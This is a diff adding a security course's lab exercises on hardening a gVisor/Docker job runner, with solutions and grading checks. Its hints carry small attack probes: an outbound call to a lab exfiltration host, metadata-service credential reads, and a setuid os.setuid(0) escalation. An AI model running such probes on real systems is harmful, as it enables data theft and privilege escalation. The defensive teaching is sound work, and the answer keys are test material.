@@ -1,0 +1,1728 @@
+track: defensive
+module: Sandboxing untrusted code
+profile: docker
+order: 9
+exercises:
+
+# ===== Beginner: a second kernel between the job and the host =====
+
+- id: sec-093
+  title: A second runtime, a second kernel
+  difficulty: 1
+  kind: build
+  tags: [gvisor, runsc, docker, sandbox, container-runtime]
+  tutorial: |
+    **What you're learning.** What gVisor is, how to register its runtime `runsc` with Docker, and how to tell a sandboxed container from a normal one.
+
+    ### gVisor from zero
+
+    A normal container is just processes on the **host's kernel**, fenced in by namespaces, cgroups and seccomp. Every system call the code makes goes straight to that one shared kernel, so a single kernel bug can turn into an escape. That's fine for your own code. It's the wrong default for **untrusted code**: a customer's script, a pull request's tests, code a model just wrote.
+
+    **gVisor** puts a second kernel in between. Its runtime, **`runsc`**, starts each container inside a *sandbox*: a user-space kernel called the **Sentry** (written in Go) answers the container's system calls itself. The Sentry needs only a small, seccomp-filtered set of host system calls, and files reach it through a separate helper process (the *gofer*).
+
+    ```
+    runc:   app ──syscalls──▶ host kernel
+    runsc:  app ──syscalls──▶ Sentry (gVisor's kernel, a host process) ──a few syscalls──▶ host kernel
+    ```
+
+    Docker doesn't care which runtime runs a container. `runc` is the default, and you can register others in `/etc/docker/daemon.json` and pick one per container with `--runtime`.
+
+    ### Commands you'll use
+
+    ```bash
+    runsc --version                      # runsc version release-20261109.0
+    sudo runsc install                   # adds {"runtimes": {"runsc": {"path": "/usr/local/bin/runsc"}}} to daemon.json
+    sudo systemctl restart docker
+    docker info --format '{{json .Runtimes}}' | jq 'keys'    # ["io.containerd.runc.v2", "runc", "runsc"]
+    docker run --rm --runtime runsc alpine:3.22 dmesg | head -2
+    #   [   0.000000] Starting gVisor...
+    docker inspect -f '{{.HostConfig.Runtime}}' web          # runc
+    ```
+
+    `runsc install --runtime NAME -- --flag ...` registers a second entry with extra runsc flags (later exercises use that). You can also edit `daemon.json` by hand. Either way, Docker only reads it on restart, and a restart stops running containers unless `live-restore` is on.
+
+    Inside the sandbox, `uname -r` reports gVisor's own version string, not the host's kernel. That's the quickest proof of where a container really runs.
+
+    ### Common mistakes
+
+    - Editing `daemon.json` and forgetting `systemctl restart docker`: `--runtime runsc` then fails with *unknown or invalid runtime name*.
+    - Broken JSON in `daemon.json`: Docker won't start at all. `sudo dockerd --validate` checks the file first.
+    - Thinking `--runtime runsc` is a security option you can add to `docker exec`: the runtime is fixed when the container is created.
+
+    ### Check your work
+
+    `docker inspect -f '{{.HostConfig.Runtime}}' sandbox` prints `runsc`, and `docker exec sandbox uname -r` differs from `uname -r`.
+  scenario: |
+    The platform team will run **untrusted jobs** on this Docker host, and
+    they want them in **gVisor** rather than plain containers. `runsc` is
+    already installed in `/usr/local/bin` but Docker doesn't know about it.
+
+    1. Register gVisor with Docker as a runtime named **`runsc`**.
+    2. Start a long-running container named **`sandbox`** under that runtime,
+       from the job image **`kl-job:1`** (for example `sleep infinity`).
+    3. Write **`/lab/kernels.txt`** with two lines: the kernel release the
+       **host** reports (`uname -r`), then the one the **sandbox** reports.
+  hints:
+    - "`sudo runsc install` writes the runtime entry for you; then restart Docker."
+    - "`docker run -d --name sandbox --runtime runsc kl-job:1 sleep infinity`"
+    - "`{ uname -r; docker exec sandbox uname -r; } > /lab/kernels.txt`"
+  solution: |
+    ```bash
+    sudo runsc install
+    sudo systemctl restart docker
+    docker run -d --name sandbox --runtime runsc kl-job:1 sleep infinity
+    { uname -r; docker exec sandbox uname -r; } > /lab/kernels.txt
+    ```
+    The host runs Ubuntu's kernel (`6.8.0-…`); the sandbox reports gVisor's
+    fixed `4.19.0-gvisor` (or similar), because its system calls never reach the host kernel.
+  setup: |
+    gv_ready
+  check: |
+    check "Docker has a runtime named runsc that runs /usr/local/bin/runsc" \
+      '[ "$(docker info --format "{{json .Runtimes}}" | jq -r ".runsc.path")" = /usr/local/bin/runsc ]'
+    check "container sandbox is running" 'c_running sandbox'
+    check_eq "sandbox runs under runsc" "$(c_get sandbox '{{.HostConfig.Runtime}}')" runsc
+    check_eq "sandbox is made from kl-job:1" "$(c_get sandbox '{{.Config.Image}}')" kl-job:1
+    sk=$(docker exec sandbox uname -r 2>/dev/null)
+    check_match "the sandbox reports gVisor's kernel" "$sk" 'gvisor'
+    check_eq "kernels.txt line 1 is the host's kernel" "$(sed -n 1p /lab/kernels.txt 2>/dev/null)" "$(uname -r)"
+    check_eq "kernels.txt line 2 is the sandbox's kernel" "$(sed -n 2p /lab/kernels.txt 2>/dev/null)" "$sk"
+  solve: |
+    sudo runsc install
+    sudo systemctl restart docker
+    docker run -d --name sandbox --runtime runsc kl-job:1 sleep infinity
+    { uname -r; docker exec sandbox uname -r; } > /lab/kernels.txt
+  deliverables: [kernels.txt]
+
+- id: sec-094
+  title: Which jobs escaped the sandbox?
+  difficulty: 1
+  kind: fix
+  tags: [gvisor, runsc, docker, inventory, audit]
+  tutorial: |
+    **What you're learning.** Auditing which runtime each container uses, and moving containers into the sandbox without losing their identity.
+
+    ### The idea
+
+    A sandbox only protects the containers that actually run in it. `--runtime runsc` is a per-container choice, so one script that forgets the flag, or a colleague's `docker run` by hand, puts untrusted code straight back on the host kernel. Nothing warns you about it. You have to **look**.
+
+    The runtime is in each container's configuration:
+
+    ```bash
+    docker inspect -f '{{.Name}} {{.HostConfig.Runtime}}' $(docker ps -q)
+    #   /api runc
+    #   /worker-7 runsc
+    docker ps --filter label=tier=batch --format '{{.Names}}'     # only containers with that label
+    docker inspect -f '{{index .Config.Labels "tier"}}' worker-7  # batch
+    ```
+
+    You can't switch a running container's runtime. You **re-create** it: remove it and run it again with the same name, image, labels and command, adding `--runtime runsc`.
+
+    ```bash
+    docker inspect -f '{{.Config.Image}} {{json .Config.Cmd}}' worker-7    # kl-job:1 ["sleep","infinity"]
+    docker rm -f worker-7
+    docker run -d --name worker-7 --label tier=batch --runtime runsc kl-job:1 sleep infinity
+    ```
+
+    Docker can make the choice for you with `"default-runtime": "runsc"` in `daemon.json`. That's handy on a host that runs only untrusted work, but it changes every container on the host, including your own tools.
+
+    ### Common mistakes
+
+    - Reading `docker info`'s *Default Runtime* and assuming every container uses it: `--runtime` overrides it.
+    - Re-creating a container without its labels: whatever selects jobs by label (schedulers, monitoring, this check) loses it.
+    - Leaving a leading `/` from `{{.Name}}` in a list of names.
+
+    ### Check your work
+
+    Every `role=job` container shows `runsc`, and there are as many of them as before.
+  scenario: |
+    gVisor is registered as runtime `runsc`, and every untrusted job on this
+    host should run under it. The jobs are the containers labelled
+    **`role=job`**. An audit suspects some were started by an old script
+    that forgot `--runtime runsc`.
+
+    1. Write the **names** of the `role=job` containers that are **not**
+       running under gVisor to **`/lab/unsandboxed.txt`**, one per line.
+    2. Move them into the sandbox: same **name**, same **image**, same
+       **command**, still labelled **`role=job`**, now under **`runsc`**.
+
+    Leave the containers that aren't jobs alone.
+  hints:
+    - "`docker ps --filter label=role=job -q | xargs docker inspect -f '{{.Name}} {{.HostConfig.Runtime}}'`"
+    - "The command is in `{{json .Config.Cmd}}`; the image in `{{.Config.Image}}`."
+    - "`docker rm -f NAME && docker run -d --name NAME --label role=job --runtime runsc kl-job:1 sleep infinity`"
+  solution: |
+    ```bash
+    docker ps -q --filter label=role=job | xargs docker inspect -f '{{.Name}} {{.HostConfig.Runtime}}' \
+      | awk '$2 != "runsc" {sub("^/", "", $1); print $1}' > /lab/unsandboxed.txt
+    for n in $(cat /lab/unsandboxed.txt); do
+      docker rm -f "$n"
+      docker run -d --name "$n" --label role=job --runtime runsc kl-job:1 sleep infinity
+    done
+    ```
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    names=$(printf '%s\n' ocr-batch pdf-render lint-pr-412 notebook-7 csv-import thumbnailer | shuf | head -5)
+    bad=$(printf '%s\n' $names | shuf | head -2 | sort)
+    printf '%s\n' $bad >"$KL_STATE/answer"
+    for n in $names; do
+      rt=runsc
+      grep -qx "$n" "$KL_STATE/answer" && rt=runc
+      docker run -d --name "$n" --label role=job --runtime $rt kl-job:1 sleep infinity >/dev/null
+    done
+    docker run -d --name kl-metrics --label role=infra kl-job:1 sleep infinity >/dev/null
+    printf '%s\n' $names | sort >"$KL_STATE/jobs"
+  check: |
+    check_eq "unsandboxed.txt names exactly the jobs that ran under runc" \
+      "$(grep -v '^\s*$' /lab/unsandboxed.txt 2>/dev/null | sed 's#^/##' | sort | tr '\n' ' ')" "$(sort "$KL_STATE/answer" | tr '\n' ' ')"
+    check_eq "the same jobs exist, labelled role=job" \
+      "$(docker ps --filter label=role=job --format '{{.Names}}' | sort | tr '\n' ' ')" "$(tr '\n' ' ' <"$KL_STATE/jobs")"
+    for n in $(cat "$KL_STATE/jobs"); do
+      check_eq "$n runs under runsc" "$(c_get "$n" '{{.HostConfig.Runtime}}')" runsc
+      check_eq "$n still runs kl-job:1 sleep infinity" "$(c_get "$n" '{{.Config.Image}} {{join .Config.Cmd " "}}')" "kl-job:1 sleep infinity"
+    done
+    check_eq "kl-metrics (not a job) was left alone" "$(c_get kl-metrics '{{.HostConfig.Runtime}} {{.State.Running}}')" "runc true"
+  solve: |
+    docker ps -q --filter label=role=job | xargs docker inspect -f '{{.Name}} {{.HostConfig.Runtime}}' \
+      | awk '$2 != "runsc" {sub("^/", "", $1); print $1}' > /lab/unsandboxed.txt
+    for n in $(cat /lab/unsandboxed.txt); do
+      docker rm -f "$n"
+      docker run -d --name "$n" --label role=job --runtime runsc kl-job:1 sleep infinity
+    done
+  deliverables: [unsandboxed.txt]
+
+- id: sec-095
+  title: A sandbox with no way out
+  difficulty: 2
+  kind: fix
+  tags: [gvisor, runsc, docker, network, egress, exfiltration]
+  tutorial: |
+    **What you're learning.** Why a sandboxed job still needs its network taken away, and how `--network none` does it.
+
+    ### The idea
+
+    gVisor protects the **host kernel**. It does nothing about where the code can **send data**. A sandboxed container on Docker's default bridge can still:
+
+    - upload whatever it can read to any server on the internet,
+    - call services on your internal network,
+    - read the cloud **metadata service** at `169.254.169.254`, which hands out the machine's credentials,
+    - connect to services on the host itself through the bridge's gateway address.
+
+    Most batch jobs (convert this file, run these tests, score this data) need **no network at all**. `--network none` gives the container only a loopback interface: there is no route anywhere, so every connection fails at once.
+
+    ```bash
+    docker run --rm --runtime runsc --network none kl-job:1 python3 -c \
+      'import urllib.request; urllib.request.urlopen("http://192.0.2.10/", timeout=3)'
+    #   urllib.error.URLError: <urlopen error [Errno 101] Network is unreachable>
+    docker run --rm --runtime runsc --network none kl-job:1 ip addr   # only lo
+    ```
+
+    gVisor has its own network stack (netstack) in the Sentry. With `--network none` there is simply no device for it to send packets through.
+
+    ### The runner pattern
+
+    The rest of this module hardens one script, **`run-job.sh JOBDIR OUTDIR`**: it runs the job's `main.py` with its folder at `/job` (read-only) and an output folder at `/out`, and exits with the job's exit code. The checks run harmless and hostile jobs through it and look at what happened.
+
+    ### Common mistakes
+
+    - Trusting the job's code review instead of the sandbox: the hostile job here looks like any other script.
+    - `--network host`: the opposite of what you want. The job shares the host's network and can reach everything the host can.
+    - Thinking gVisor alone stops exfiltration: it isolates system calls, not traffic.
+
+    ### Check your work
+
+    Run a job yourself: `mkdir -p /tmp/o && /lab/run-job.sh /lab/sample-job /tmp/o && cat /tmp/o/result.json`.
+  scenario: |
+    **`/lab/run-job.sh JOBDIR OUTDIR`** runs untrusted jobs (`JOBDIR/main.py`)
+    under gVisor. Last night one job uploaded its input to a server at
+    `10.99.0.20` and read credentials from the metadata service at
+    `169.254.169.254`. gVisor didn't stop it: it runs code, it doesn't
+    filter traffic.
+
+    These jobs never need the network. Change the runner so a job **can't
+    reach anything**: not the internet, not the internal network, not the
+    metadata service, not the host. Jobs must keep working, under `runsc`,
+    and their exit code must still be the runner's.
+
+    `/lab/sample-job/` is a harmless job you can try it with.
+  hints:
+    - "Run `/lab/sample-job` through the runner with `main.py` replaced by a `urllib.request.urlopen(\"http://10.99.0.20:8080/\")`: it works today."
+    - "One `docker run` option takes every network away."
+    - "Add `--network none` to the runner's `docker run`."
+  solution: |
+    ```bash
+    exec docker run --rm --runtime runsc --network none \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py
+    ```
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    gv_outside
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    exec docker run --rm --runtime runsc \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py
+    EOF
+    mkdir -p /lab/sample-job
+    cp "$GV_KIT/jobs/normal.py" /lab/sample-job/main.py
+    seq 1 10 | tr '\n' ' ' >/lab/sample-job/input.txt
+    chown -R "$(lab_user)": /lab/sample-job
+  check: |
+    gv_run normal
+    check_eq "a normal job still succeeds" "$GV_RC" 0
+    check_eq "and gets the right answer" "$(gj result.json .sum)" "$(gv_sum)"
+    check_match "it ran under gVisor" "$(gj result.json .kernel)" gvisor
+    gv_run net
+    check_match "the job couldn't reach 10.99.0.20" "$(gj net.json .exfil)" '^blocked'
+    check_eq "10.99.0.20 received nothing" "$(gv_hits exfil)" 0
+    check_match "the job couldn't reach the metadata service" "$(gj net.json .meta)" '^blocked'
+    check_eq "the metadata service received nothing" "$(gv_hits meta)" 0
+    check_match "nor the internet" "$(gj net.json .internet)" '^blocked'
+    check_match "nor the host" "$(gj net.json .host_ssh)" '^blocked'
+    gv_job exit5 <<'PY'
+    import sys
+    print("failing on purpose")
+    sys.exit(5)
+    PY
+    gv_run exit5
+    check_eq "the runner exits with the job's exit code" "$GV_RC" 5
+  solve: |
+    sed -i 's/--runtime runsc \\/--runtime runsc --network none \\/' /lab/run-job.sh
+  deliverables: [run-job.sh]
+
+- id: sec-096
+  title: Read-only, with a small scratch space
+  difficulty: 2
+  kind: fix
+  tags: [gvisor, docker, read-only, tmpfs, mounts, sandbox]
+  tutorial: |
+    **What you're learning.** Giving a job a read-only root filesystem, a size-limited `/tmp`, and read-only input, so the only place it can write is its output folder.
+
+    ### The idea
+
+    By default a container's root filesystem is writable. Untrusted code can change the image's programs and libraries for the rest of its run (drop a `.pth` file into `site-packages` and every later `python` runs it), fill the host's disk through the container's writable layer, or overwrite its own **input**, so whoever reads the results later reads something else.
+
+    Three options take that away:
+
+    | option | effect |
+    |---|---|
+    | `--read-only` | the image's filesystem can't be written at all |
+    | `--tmpfs /tmp:size=32m` | a RAM-backed `/tmp`, gone when the container stops, at most 32 MiB |
+    | `-v DIR:/job:ro` | a bind mount the container can read but not change |
+
+    Only the mounts you add without `:ro` stay writable, so the job's single exit for data is `/out`.
+
+    ```bash
+    docker run --rm --runtime runsc --read-only --tmpfs /tmp:size=8m kl-job:1 sh -c \
+      'touch /etc/x; dd if=/dev/zero of=/tmp/f bs=1M count=20'
+    #   touch: /etc/x: Read-only file system
+    #   dd: error writing '/tmp/f': No space left on device     (stopped at 8 MiB)
+    ```
+
+    A `tmpfs` counts against the container's memory, so its size is also a memory budget. Under gVisor the limit is enforced by the Sentry's own tmpfs.
+
+    ### Common mistakes
+
+    - `--read-only` without a `/tmp`: many programs (Python's `tempfile`, compilers, `pip`) need somewhere to write and fail.
+    - `--tmpfs /tmp` without `size=`: the default is half the RAM the container can see.
+    - Mounting the input folder writable "because it's the job's own folder": the job is exactly what you don't trust.
+
+    ### Check your work
+
+    A job that writes to `/etc`, `site-packages`, its input and a 256 MiB file in `/tmp` fails at each one, but can still write to `/out`.
+  scenario: |
+    Jobs now run with no network (`/lab/run-job.sh`). The next report: a job
+    **rewrote its own input file**, so the results the team reviewed didn't
+    match what it really processed, and another job dropped a file into
+    Python's `site-packages` inside its container and wrote a 2 GB file to
+    the container's disk.
+
+    Change the runner so that:
+
+    - the job's **root filesystem is read-only**;
+    - **`/tmp`** is writable scratch space of **at most 64 MiB** (jobs need a
+      few MiB there);
+    - the job folder at `/job` **can't be changed**;
+    - **`/out`** stays writable, and jobs still work under `runsc` with no network.
+  hints:
+    - "Look at the mount of `$job`: is it read-only?"
+    - "`--read-only` and `--tmpfs /tmp:size=64m` are two options of `docker run`."
+    - "`-v \"$job\":/job:ro`"
+  solution: |
+    ```bash
+    exec docker run --rm --runtime runsc --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py
+    ```
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    exec docker run --rm --runtime runsc --network none \
+      -v "$job":/job -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py
+    EOF
+  check: |
+    gv_run normal
+    check_eq "a normal job still succeeds" "$GV_RC" 0
+    check_eq "with the right answer" "$(gj result.json .sum)" "$(gv_sum)"
+    check_eq "and its scratch file in /tmp" "$(gj result.json .tmp_ok)" true
+    check_match "under gVisor" "$(gj result.json .kernel)" gvisor
+    gv_run writes
+    in=$(dirname "$GV_OUT")/$GV_JOB/input.txt
+    check_match "writing to /etc is refused" "$(gj fs.json .etc)" '^blocked'
+    check_match "writing to site-packages is refused" "$(gj fs.json '.site_packages')" '^blocked'
+    check_match "changing the job's input is refused" "$(gj fs.json .input)" '^blocked'
+    check_not "the input file is unchanged" 'grep -q 999999 "$in"'
+    check_match "a 256 MiB file doesn't fit in /tmp" "$(gj fs.json .tmp_256mb)" '^blocked'
+    check_eq "/out is still writable" "$(gj fs.json .out)" succeeded
+    gv_inspect
+    check_eq "the root filesystem is read-only" "$(gi .HostConfig.ReadonlyRootfs)" true
+    sz=$(gi '.HostConfig.Tmpfs["/tmp"] // ""' | grep -oE 'size=[0-9]+[kmgKMG]?' | cut -d= -f2)
+    check "/tmp is a tmpfs of at most 64 MiB" '[ -n "$sz" ] && [ "$(numfmt --from=iec "${sz^^}")" -le 67108864 ]'
+    check_eq "there is still no network" "$(gi .HostConfig.NetworkMode)" none
+  solve: |
+    sed -i 's#--network none \\#--network none --read-only --tmpfs /tmp:size=64m \\#; s#-v "$job":/job #-v "$job":/job:ro #' /lab/run-job.sh
+  deliverables: [run-job.sh]
+
+- id: sec-097
+  title: Not root, and no way back to root
+  difficulty: 2
+  kind: fix
+  tags: [gvisor, docker, capabilities, no-new-privileges, setuid, non-root]
+  tutorial: |
+    **What you're learning.** Running jobs as an unprivileged user with no capabilities, and why `no-new-privileges` matters even then.
+
+    ### The idea
+
+    Unless the image or `docker run` says otherwise, the job runs as **root (uid 0)** inside the container, with Docker's default set of **capabilities** (`CAP_CHOWN`, `CAP_DAC_OVERRIDE`, `CAP_SETUID`, `CAP_NET_RAW`, …). Root inside a container isn't root on the host, but it's the starting point of most escapes, and it can do anything inside the container.
+
+    Three options take it away:
+
+    | option | effect |
+    |---|---|
+    | `--user 65534:65534` | run as `nobody`, a uid that owns nothing |
+    | `--cap-drop ALL` | no capabilities at all, even for root |
+    | `--security-opt no-new-privileges` | `execve` can never **gain** privileges: setuid/setgid bits and file capabilities are ignored |
+
+    Why the third one? Images often ship a **setuid-root binary** (an old helper, `su`, `ping` on some distributions). A non-root user runs it, the kernel makes it root, and `--user` was for nothing. `no-new-privileges` sets the kernel's `PR_SET_NO_NEW_PRIVS` flag, so the setuid bit does nothing:
+
+    ```bash
+    ls -l /usr/local/bin/helper            # -rwsr-xr-x root root  (a setuid copy of python)
+    docker run --rm --user 1000 IMG helper -c 'import os; os.setuid(0); print(os.getuid())'     # 0
+    docker run --rm --user 1000 --security-opt no-new-privileges IMG helper -c '...'           # PermissionError
+    grep -E 'CapEff|NoNewPrivs' /proc/self/status       # what a process has right now
+    ```
+
+    **gVisor ignores setuid bits by default** (its `--allow-suid` flag is off), so under `runsc` that helper can't make you root anyway. Under `runc` it can. A runner that also offers `runc` as a fallback needs every one of these options.
+
+    `--user` needs a writable `/tmp` and `/out` for that uid: tmpfs mounts are world-writable (mode 1777), and the output folder here is too.
+
+    ### Common mistakes
+
+    - `--user` alone: setuid binaries in the image turn you back into root.
+    - `--cap-drop ALL` alone: root still owns every file in the image.
+    - `--privileged` "to make it work": it gives everything back, and more.
+
+    ### Check your work
+
+    A job reports `uid` 65534, `CapEff: 0000000000000000` and `NoNewPrivs: 1`, under both runtimes.
+  scenario: |
+    `/lab/run-job.sh` runs jobs under gVisor with no network and a read-only
+    root. Some jobs don't work under gVisor yet, so the runner has a
+    fallback: **`RUNTIME=runc /lab/run-job.sh …`** runs them in a plain container.
+
+    The job image `kl-job:1` ships a **setuid-root helper**,
+    `/usr/local/bin/helper`. Jobs run as root anyway, so nobody noticed.
+
+    Change the runner so that, under **both** runtimes, a job:
+
+    - runs as **uid 65534** (`nobody`), not root;
+    - has **no capabilities**;
+    - **can't gain privileges** through setuid binaries like the helper.
+
+    Jobs must keep working: they read `/job`, write `/tmp` and `/out`.
+  hints:
+    - "`RUNTIME=runc /lab/run-job.sh DIR OUT` with a `main.py` that runs `/usr/local/bin/helper -c 'import os; os.setuid(0); print(os.getuid())'`"
+    - "Three `docker run` options: one for the user, one for capabilities, one `--security-opt`."
+    - "`--user 65534:65534 --cap-drop ALL --security-opt no-new-privileges`"
+  solution: |
+    ```bash
+    exec docker run --rm --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py
+    ```
+    Under `runc` without `no-new-privileges`, `helper` still turns uid 65534
+    into root: the saved set-user-ID is 0, and going back to it needs no capability.
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's. RUNTIME=runc: the fallback for jobs gVisor can't run yet.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    exec docker run --rm --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py
+    EOF
+  check: |
+    for rt in runsc runc; do
+      gv_run normal 60 RUNTIME=$rt
+      check_eq "[$rt] a normal job still succeeds" "$GV_RC" 0
+      check_eq "[$rt] with the right answer, using /tmp" "$(gj result.json '"\(.sum) \(.tmp_ok)"')" "$(gv_sum) true"
+      check_eq "[$rt] the job runs as uid 65534" "$(gj result.json '"\(.uid) \(.euid)"')" "65534 65534"
+      check_eq "[$rt] with no capabilities" "$(gj result.json .cap_eff)" 0000000000000000
+      gv_run escalate 60 RUNTIME=$rt
+      check_eq "[$rt] the setuid helper doesn't make it root" "$(gj escalate.json .became_root)" false
+      check_match "[$rt] chown is refused" "$(gj escalate.json .chown)" '^blocked'
+    done
+    gv_run normal
+    check_match "the default runtime is still gVisor" "$(gj result.json .kernel)" gvisor
+    gv_inspect
+    check "no-new-privileges is set" 'gi ".HostConfig.SecurityOpt[]?" | grep -qE "^no-new-privileges(:true|=true)?$"'
+    check "every capability is dropped" 'gi ".HostConfig.CapDrop[]?" | grep -qiE "^(CAP_)?ALL$"'
+  solve: |
+    sed -i 's#--read-only --tmpfs /tmp:size=64m \\#--read-only --tmpfs /tmp:size=64m \\\n  --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \\#' /lab/run-job.sh
+  deliverables: [run-job.sh]
+
+- id: sec-098
+  title: Memory and CPU are part of the sandbox
+  difficulty: 2
+  kind: fix
+  tags: [gvisor, docker, cgroups, memory, cpu, oom, limits]
+  tutorial: |
+    **What you're learning.** Capping a sandbox's memory and CPU with cgroups, and what happens to a job that goes over.
+
+    ### The idea
+
+    Isolation doesn't stop a job from **using up the machine**. A job that allocates 3 GiB on a 4 GiB host pushes everything else into the kernel's OOM killer, and the victim it picks may be your database, not the job. A job spinning on every core slows down everything else on the host.
+
+    Docker puts each container in a **cgroup** and can cap it:
+
+    | option | effect |
+    |---|---|
+    | `--memory 256m` | at most 256 MiB of RAM; past that, the kernel kills the container |
+    | `--memory-swap 256m` | RAM + swap together: equal to `--memory` means **no swap** |
+    | `--cpus 1` | at most one CPU's worth of time, however many threads it runs |
+
+    Under gVisor the cgroup holds the whole sandbox, the Sentry and the gofer included. Their overhead (some tens of MiB) counts against the limit, so leave a little room.
+
+    ```bash
+    docker run --rm --runtime runsc --memory 64m --memory-swap 64m kl-job:1 \
+      python3 -c 'b = [bytearray(10**6) for _ in range(300)]'
+    echo $?                                      # 137 = killed by SIGKILL (128 + 9)
+    docker inspect -f '{{.State.OOMKilled}}' NAME  # true (for a container that wasn't --rm)
+    docker stats --no-stream NAME                # MEM USAGE / LIMIT, CPU %
+    docker inspect -f '{{.HostConfig.Memory}} {{.HostConfig.NanoCpus}}' NAME   # 268435456 1000000000
+    ```
+
+    The job doesn't get a polite `MemoryError`: Linux hands out memory lazily, so the process is simply **killed** when it touches too much. Exit code **137** is how a runner tells "out of memory" from an ordinary failure.
+
+    ### Common mistakes
+
+    - `--memory` without `--memory-swap`: Docker then allows the same amount again in swap, on hosts that have it.
+    - `--cpu-shares`: a *relative weight* that only matters when CPUs are contended. It's not a cap.
+    - A limit so tight the sandbox itself can't start: under gVisor, start from about 64 MiB above what the job needs.
+
+    ### Check your work
+
+    A job that allocates 2 GiB ends with exit code 137; a normal job still finishes.
+  scenario: |
+    A job allocated **2 GiB** on this 4 GiB host last night and the kernel's
+    OOM killer took out the CI agent instead. Another one kept both CPUs busy
+    for an hour.
+
+    Change **`/lab/run-job.sh`** so every job gets:
+
+    - at most **256 MiB of memory**, with **no swap** on top;
+    - at most **one CPU**.
+
+    A job that goes over its memory must be **killed**, and the runner must
+    exit with the job's exit code (**137**). Normal jobs must keep working.
+  hints:
+    - "Two memory options: one for RAM, one for RAM plus swap."
+    - "`--memory 256m --memory-swap 256m --cpus 1`"
+  solution: |
+    ```bash
+    exec docker run --rm --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --memory 256m --memory-swap 256m --cpus 1 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py
+    ```
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's. RUNTIME=runc: the fallback for jobs gVisor can't run yet.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    exec docker run --rm --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py
+    EOF
+  check: |
+    gv_run memhog 90
+    check_eq "a job that takes 2 GiB is killed: the runner exits 137" "$GV_RC" 137
+    check_not "it never got its 2 GiB" 'grep -q "got 2 GiB" "$GV_LOG"'
+    check "it got at least 64 MiB first (the limit isn't absurdly low)" 'grep -q "holding 64 MiB" "$GV_LOG"'
+    gv_run normal
+    check_eq "a normal job still succeeds" "$GV_RC" 0
+    check_match "under gVisor" "$(gj result.json .kernel)" gvisor
+    gv_inspect
+    check_eq "memory is capped at 256 MiB" "$(gi .HostConfig.Memory)" 268435456
+    check_eq "with no swap on top" "$(gi .HostConfig.MemorySwap)" 268435456
+    cpus=$(gi 'if .HostConfig.NanoCpus > 0 then .HostConfig.NanoCpus elif .HostConfig.CpuQuota > 0 then (.HostConfig.CpuQuota * 1000000000 / (if .HostConfig.CpuPeriod > 0 then .HostConfig.CpuPeriod else 100000 end)) else 0 end')
+    check "CPU is capped at one CPU or less" '[ "${cpus%.*}" -gt 0 ] && [ "${cpus%.*}" -le 1000000000 ]'
+  solve: |
+    sed -i 's#--security-opt no-new-privileges \\#--security-opt no-new-privileges \\\n  --memory 256m --memory-swap 256m --cpus 1 \\#' /lab/run-job.sh
+  deliverables: [run-job.sh]
+
+# ===== Intermediate: the runner itself =====
+
+- id: sec-099
+  title: The time limit that didn't stop anything
+  difficulty: 3
+  kind: fix
+  tags: [gvisor, docker, timeout, signals, cleanup, bash]
+  tutorial: |
+    **What you're learning.** Enforcing a wall-clock limit on a container: why `timeout docker run` doesn't do it, and how to stop and remove the container yourself.
+
+    ### The idea
+
+    `docker run` is only a **client**. It asks the daemon to start a container and then streams its output. Kill the client and the container doesn't notice:
+
+    ```bash
+    timeout -k 2 5 docker run --name spin IMG python3 -c 'import signal, time; signal.signal(signal.SIGTERM, signal.SIG_IGN)
+    while True: time.sleep(1)'
+    echo $?                         # 137: timeout killed the client...
+    docker ps --format '{{.Names}} {{.Status}}'     # spin   Up 9 seconds   ...the job runs on
+    ```
+
